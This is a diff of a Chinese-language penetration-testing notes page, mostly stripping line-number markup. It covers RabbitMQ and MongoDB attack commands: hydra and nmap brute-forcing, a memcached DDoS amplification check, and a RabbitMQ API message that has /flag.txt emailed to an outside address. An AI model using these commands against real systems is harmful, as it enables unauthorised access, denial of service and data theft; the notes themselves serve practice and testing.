-service rabbitmq-server restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="暴力破解-17"><a href="#暴力破解-17" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none">hydra -L &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;simple-users.txt -P &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;password.lst domain.htb  http-post-form &quot;&#x2F;path&#x2F;index.php:name&#x3D;^USER^&amp;password&#x3D;^PASS^&amp;enter&#x3D;Sign+in:Login name or password is incorrect&quot; -V
-# Use https-post-form mode for httpS<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<h4 id="API使用"><a href="#API使用" class="headerlink" title="API使用"></a>API使用</h4><pre class="line-numbers language-none"><code class="language-none">1）API信息
+msf &gt; use auxiliary&#x2F;scanner&#x2F;memcached&#x2F;memcached_amp  #Check is UDP DDoS amplification attack is possible </code></pre>
+<h3 id="15672-RabbitMQ-Management"><a href="#15672-RabbitMQ-Management" class="headerlink" title="15672-RabbitMQ Management"></a>15672-RabbitMQ Management</h3><h4 id="启动插件"><a href="#启动插件" class="headerlink" title="启动插件"></a>启动插件</h4><pre class="language-none"><code class="language-none">rabbitmq-plugins enable rabbitmq_management
+service rabbitmq-server restart</code></pre>
+<h4 id="暴力破解-17"><a href="#暴力破解-17" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none">hydra -L &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;simple-users.txt -P &#x2F;usr&#x2F;share&#x2F;brutex&#x2F;wordlists&#x2F;password.lst domain.htb  http-post-form &quot;&#x2F;path&#x2F;index.php:name&#x3D;^USER^&amp;password&#x3D;^PASS^&amp;enter&#x3D;Sign+in:Login name or password is incorrect&quot; -V
+# Use https-post-form mode for httpS</code></pre>
+<h4 id="API使用"><a href="#API使用" class="headerlink" title="API使用"></a>API使用</h4><pre class="language-none"><code class="language-none">1）API信息
 
 http:&#x2F;&#x2F;localhost:15672&#x2F;api&#x2F;connections
 
@@ -1421,10 +1421,10 @@ Content-Type: application&#x2F;json;charset&#x3D;UTF-8
 Content-Length: 267
 
 &#123;&quot;vhost&quot;:&quot;&#x2F;&quot;,&quot;name&quot;:&quot;amq.default&quot;,&quot;properties&quot;:&#123;&quot;delivery_mode&quot;:1,&quot;headers&quot;:&#123;&#125;&#125;,&quot;routing_key&quot;:&quot;email&quot;,&quot;delivery_mode&quot;:&quot;1&quot;,&quot;payload&quot;:&quot;&#123;\&quot;to\&quot;:\&quot;zevtnax+ppp@gmail.com\&quot;, \&quot;attachments\&quot;: [&#123;\&quot;path\&quot;: \&quot;&#x2F;flag.txt\&quot;&#125;]&#125;&quot;,&quot;headers&quot;:&#123;&#125;,&quot;props&quot;:&#123;&#125;,&quot;payload_encoding&quot;:&quot;string&quot;&#125;
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+</code></pre>
 <p>refer: <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/15672-pentesting-rabbitmq-management">https://book.hacktricks.xyz/pentesting/15672-pentesting-rabbitmq-management</a></p>
-<h3 id="27017-x2F-27018-MongoDB"><a href="#27017-x2F-27018-MongoDB" class="headerlink" title="27017&#x2F;27018: MongoDB"></a>27017&#x2F;27018: MongoDB</h3><h4 id="自动枚举-1"><a href="#自动枚举-1" class="headerlink" title="自动枚举"></a>自动枚举</h4><pre class="line-numbers language-none"><code class="language-none">nmap -sV --script &quot;mongo* and default&quot; -p 27017 &lt;IP&gt;   #By default all the nmap mongo enumerate scripts are used<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h4 id="手动枚举"><a href="#手动枚举" class="headerlink" title="手动枚举"></a>手动枚举</h4><pre class="line-numbers language-none"><code class="language-none">from pymongo import MongoClient
+<h3 id="27017-x2F-27018-MongoDB"><a href="#27017-x2F-27018-MongoDB" class="headerlink" title="27017&#x2F;27018: MongoDB"></a>27017&#x2F;27018: MongoDB</h3><h4 id="自动枚举-1"><a href="#自动枚举-1" class="headerlink" title="自动枚举"></a>自动枚举</h4><pre class="language-none"><code class="language-none">nmap -sV --script &quot;mongo* and default&quot; -p 27017 &lt;IP&gt;   #By default all the nmap mongo enumerate scripts are used</code></pre>
+<h4 id="手动枚举"><a href="#手动枚举" class="headerlink" title="手动枚举"></a>手动枚举</h4><pre class="language-none"><code class="language-none">from pymongo import MongoClient
 client &#x3D; MongoClient(host, port, username&#x3D;username, password&#x3D;password)
 client.server_info() #Basic info
 #If you have admin access you can obtain more info
@@ -1434,13 +1434,13 @@ cursor &#x3D; client.list_databases()
 for db in cursor:
     print(db)
     print(client[db[&quot;name&quot;]].list_collection_names())
-#If admin access, you could dump the database also<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="连接登录"><a href="#连接登录" class="headerlink" title="连接登录"></a>连接登录</h4><pre class="line-numbers language-none"><code class="language-none">mongo &lt;HOST&gt;
+#If admin access, you could dump the database also</code></pre>
+<h4 id="连接登录"><a href="#连接登录" class="headerlink" title="连接登录"></a>连接登录</h4><pre class="language-none"><code class="language-none">mongo &lt;HOST&gt;
 mongo &lt;HOST&gt;:&lt;PORT&gt;
 mongo &lt;HOST&gt;:&lt;PORT&gt;&#x2F;&lt;DB&gt;
-mongo &lt;database&gt; -u &lt;username&gt; -p &#39;&lt;password&gt;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<h4 id="暴力破解-18"><a href="#暴力破解-18" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="line-numbers language-none"><code class="language-none">nmap -sV --script mongodb-brute -n -p 27017 &lt;IP&gt;
-use auxiliary&#x2F;scanner&#x2F;mongodb&#x2F;mongodb_login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+mongo &lt;database&gt; -u &lt;username&gt; -p &#39;&lt;password&gt;&#39;</code></pre>
+<h4 id="暴力破解-18"><a href="#暴力破解-18" class="headerlink" title="暴力破解"></a>暴力破解</h4><pre class="language-none"><code class="language-none">nmap -sV --script mongodb-brute -n -p 27017 &lt;IP&gt;
+use auxiliary&#x2F;scanner&#x2F;mongodb&#x2F;mongodb_login</code></pre>
 <p>refer: <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting/27017-27018-mongodb">https://book.hacktricks.xyz/pentesting/27017-27018-mongodb</a></p>
 <hr>
 <h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
